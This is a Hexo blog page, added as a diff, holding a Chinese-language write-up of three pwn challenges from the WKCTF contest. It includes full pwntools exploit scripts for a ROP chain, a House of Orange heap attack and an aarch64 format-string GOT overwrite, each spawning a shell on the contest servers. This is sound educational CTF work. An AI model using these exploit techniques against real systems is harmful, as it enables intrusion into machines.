@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="baby_stackwait函数里面有个格式化字符串，多试几次能试出来offset&#x3D;20时拿到libc   v2长度为256字节，此函数中的a1[256]会造成栈上的off by null  布置的payload，rbp每次低字节为00  可以用ret填，不过exp多打几次出了  #coding:utf-8 from pwn import * from tw11ty import * #">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WKCTF-pwn">
+<meta property="og:url" content="http://example.com/2024/07/15/WKCTF-pwn/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="baby_stackwait函数里面有个格式化字符串，多试几次能试出来offset&#x3D;20时拿到libc   v2长度为256字节，此函数中的a1[256]会造成栈上的off by null  布置的payload，rbp每次低字节为00  可以用ret填，不过exp多打几次出了  #coding:utf-8 from pwn import * from tw11ty import * #">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130699.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130615.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130539.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130633.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130098.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130370.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130428.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151137538.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131796.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130281.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131895.png">
+<meta property="article:published_time" content="2024-07-15T03:33:07.000Z">
+<meta property="article:modified_time" content="2024-07-15T03:39:20.692Z">
+<meta property="article:author" content="kkkk">
+<meta property="article:tag" content="writewp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130699.png">
+
+
+<link rel="canonical" href="http://example.com/2024/07/15/WKCTF-pwn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/07/15/WKCTF-pwn/","path":"2024/07/15/WKCTF-pwn/","title":"WKCTF-pwn"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>WKCTF-pwn | tw11ty</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">tw11ty</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A blog powered by Hexo</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-stack"><span class="nav-number">1.</span> <span class="nav-text">baby_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-heap"><span class="nav-number">2.</span> <span class="nav-text">easy_heap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#something-changed"><span class="nav-number">3.</span> <span class="nav-text">something_changed</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">kkkk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/15/WKCTF-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kkkk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="WKCTF-pwn | tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WKCTF-pwn
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-07-15 11:33:07 / Modified: 11:39:20" itemprop="dateCreated datePublished" datetime="2024-07-15T11:33:07+08:00">2024-07-15</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>3 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>wait函数里面有个格式化字符串，多试几次能试出来offset&#x3D;20时拿到libc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130699.png" alt="image-20240715112838945"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130615.png" alt="image-20240715112847331"></p>
+<p>v2长度为256字节，此函数中的a1[256]会造成栈上的off by null</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130539.png" alt="image-20240715112855280"></p>
+<p>布置的payload，rbp每次低字节为00</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130633.png" alt="image-20240715112903110"></p>
+<p>可以用ret填，不过exp多打几次出了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130098.png" alt="img"></p>
+<pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;110.40.35.73 33750&#x27;</span>
+    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+    sla(<span class="string">b&#x27;Press enter to continue\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)
+    sla(<span class="string">b&#x27;Pick a number: &#x27;</span>, <span class="built_in">str</span>(<span class="number">20</span>))
+    <span class="comment"># debug()</span>
+    ru(<span class="string">b&#x27;Your magic number is: &#x27;</span>)
+    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x401b40</span>
+    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]
+    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))
+
+    sla(<span class="string">b&#x27;How many bytes do you want to read (max 256)? &#x27;</span>, <span class="built_in">str</span>(<span class="number">256</span>))
+    <span class="comment"># sleep(1)</span>
+
+    prdi = <span class="number">0x000000000002164f</span> + libc_base
+    ppr  = <span class="number">0x0000000000021b33</span> + libc_base
+
+    payload = cyclic(<span class="number">152</span>) + p64(prdi) + p64(bin_sh) + p64(ppr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)
+    payload = payload.ljust(<span class="number">256</span>, <span class="string">b&#x27;\x00&#x27;</span>)
+    <span class="comment"># debug()</span>
+    s(payload)
+
+    leak(<span class="string">"libc_base"</span>, libc_base) 
+
+    itr()</code></pre>
+
+<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>House of orange，不过show()函数只能打印8字节数据，构造两次orange，将两块相同size区间的large chunk链到一起</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130370.png" alt="image-20240715112916443"></p>
+<p>然后申请出前一块大的chunk，就能得到残留的heap指针，然后就是背板子</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130428.png" alt="image-20240715112927619"></p>
+<p>最后布置好的fake_IO_FILE结构体</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151137538.png" alt="image-20240715113709496"></p>
+<pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;>\n&#x27;</span>,<span class="built_in">str</span>(num))
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;&#x27;</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;Size :\n&#x27;</span>,<span class="built_in">str</span>(size))
+    sla(<span class="string">b&#x27;Content :\n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):
+    menu(<span class="number">2</span>)
+    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))
+    sla(<span class="string">b&#x27;Size :\n&#x27;</span>, <span class="built_in">str</span>(size))
+    sa(<span class="string">b&#x27;Content :\n&#x27;</span>, content)
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):
+    menu(<span class="number">3</span>)
+    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;110.40.35.73 33679&#x27;</span>
+    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+
+    add(<span class="number">0xaf8</span>)   <span class="comment">#0</span>
+    edit(<span class="number">0</span>, <span class="number">0xb00</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xaf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))
+    <span class="comment"># p()</span>
+    add(<span class="number">0xb18</span>)   <span class="comment">#1</span>
+    <span class="comment"># p()</span>
+    edit(<span class="number">1</span>, <span class="number">0xb20</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>))
+    <span class="comment"># p()</span>
+    add(<span class="number">0xff0</span>)   <span class="comment">#2</span>
+    <span class="comment"># p()</span>
+    add(<span class="number">0xff0</span>)   <span class="comment">#3</span>
+    <span class="comment"># debug()</span>
+    <span class="comment"># p()</span>
+    add(<span class="number">0x4e0</span>-<span class="number">8</span>) <span class="comment">#4</span>
+    <span class="comment"># p()</span>
+    <span class="comment"># debug()</span>
+    show(<span class="number">4</span>)
+    heap_addr = uu64(r(<span class="number">8</span>)) - <span class="number">0x21b0a</span>
+    
+    add(<span class="number">0x18</span>)    <span class="comment">#5</span>
+    show(<span class="number">5</span>)
+    libc_base = uu64(r64()) - <span class="number">0x3c4f0a</span>
+    leak(<span class="string">"libc_base"</span>, libc_base)   
+
+    io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]
+    system      = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]
+
+    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +  <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) + p64(io_list_all-<span class="number">0x10</span>)+p64(io_list_all-<span class="number">0x10</span>) +  p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(heap_addr+<span class="number">0x21b40</span>) +p64(<span class="number">0</span>)*<span class="number">13</span> + p64(heap_addr+<span class="number">0x21b40</span>+<span class="number">0xd8</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)
+    edit(<span class="number">5</span>, <span class="number">0x200</span>, payload)
+
+    leak(<span class="string">"heap_addr"</span>, heap_addr) 
+    <span class="comment"># debug(&#x27;tele 0x004040E0 \n b*0x40157F &#x27;)</span>
+    itr()</code></pre>
+
+<h2 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h2><p>aarch64的格式化字符串，远程是qemu起的（泄露几次发现栈地址固定），保护全关相当于是，而且这道题本身就没开FULL RELRO和pie。还给了backdoor</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131796.png" alt="image-20240715112941715"></p>
+<p>直接用一次性格式化字符串来改__stack_chk_fail_got为backdoor就行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130281.png" alt="image-20240715112949243"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131895.png" alt="image-20240715112956706"></p>
+<pre class=" language-highlight Python"><span class="comment"><code class="language-highlight Python"><span class="comment"># coding = utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    context.arch = <span class="string">&#x27;aarch64&#x27;</span>
+    IPort = <span class="string">&#x27;120.79.91.95 3332&#x27;</span>
+    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span>
+    pwnfile = <span class="string">&#x27;./silent&#x27;</span>
+    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    libc = ELF(libc_name)
+
+    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)
+    <span class="comment"># dbg("b *0x04007F4 \n b *0x000400854")</span>
+    <span class="comment"># dbg("b *0x000400854")</span>
+
+    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span>
+    backdoor = <span class="number">0x00400770</span>
+    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)
+    sl(payload)
+    itr()
+<span class="comment">#canary   %19$p</span></code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writewp/" rel="tag"># writewp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/" rel="prev" title="arm-pwn入门">
+                  <i class="fa fa-angle-left"></i> arm-pwn入门
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">kkkk</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">87k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:19</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
